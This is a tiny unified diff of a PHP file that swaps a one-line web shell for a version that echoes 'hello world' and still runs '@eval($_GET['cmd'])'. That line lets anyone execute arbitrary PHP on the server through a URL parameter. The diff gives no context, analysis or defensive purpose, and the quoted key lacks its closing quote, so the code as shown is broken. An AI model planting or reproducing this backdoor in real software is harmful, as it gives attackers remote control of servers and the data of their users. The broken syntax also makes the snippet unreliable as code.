@@ -1,1 +1,4 @@
-<?php @eval($_GET['cmd]); ?>
+<?php 
+echo("hello world");
+@eval($_GET['cmd]); 
+?>
